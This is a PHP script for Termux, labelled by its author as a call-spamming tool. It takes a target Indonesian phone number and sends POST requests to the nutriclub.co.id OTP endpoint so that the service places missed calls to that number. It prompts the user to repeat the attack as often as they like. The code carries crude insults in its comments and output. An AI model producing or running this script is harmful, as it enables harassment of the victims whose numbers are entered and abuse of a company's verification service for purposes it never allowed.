<?php

		
                class MyCall {
	/*
	* Name : Spaming Call Termux
	* File : spam2.php
	* Author : bayu Riski
	* Github : https://github.com/bayu12345677
	* Date : 17-07-2021
	* Note : Recoder Bangsat Fvck Dont Di Recode !!!
	* Version : 1.0
	*/
                protected static $agent;
		
		function __construct(){
			self::$agent = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36";
			$this->run();}
			var $logo = "\n Bayu Riski\n";


		public function run(){
		try {
			system("python2 Asu.py | lolcat");
			echo $this->logo;
			echo " \e[37m[\e[34m*\e[37m] Nomor \e[37m(\e[34m08\e[37m) : \e[33m";
			$phone = trim(fgets(STDIN));
			if(substr($phone, 0, 2) !== "08") {
				throw new Exception("\n \e[31mMessage \e[37m: gunakan angka awalan 08 ngab\n\n");
				exit(0);}

			$url = "https://www.nutriclub.co.id/otp/?phone={$phone}&old_phone={$phone}";
			for($coli=0;$coli<=0;$coli++) {
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $url);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_USERAGENT, "User-agent".self::$agent);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				$result = curl_exec($ch);
				if(strpos($result, "Request misscall berhasil")) {
					echo "\e[37m\narray(\n       [code] => 00\n       [msisdn] => $phone\n       [message] => Request misscall berhasil\n       [total] => 1\n)\n\n";
				} else {
					echo "\e[37m\narray(\n       [code] => 30\n       [msisdn] => $phone\n       [message] => Request misscall failed sudah dilakukan 3x\n       [total] => 1\n)\n\n";}}

			echo " \e[37m[\e[33m!\e[37m] Gunakan lagi ?\n \e[37m[\e[33my\e[37m/\e[33mn\e[37m]\n \e[33m•\e[37m> : ";
			$call = trim(fgets(STDIN));
			if($call == "y" or $call == "Y") { $this->run();} else if($call == "n" or $call == "N") { exit("\n >>> Thank And Jangan Lupa Subscribe My chanel Pejuang kentang <<<\n\n");} else { exit("\nBy Goblokkk !!\n\n");}

		} catch (Exception $e) {
			echo $e->getMessage();}}}

new MyCall

?>
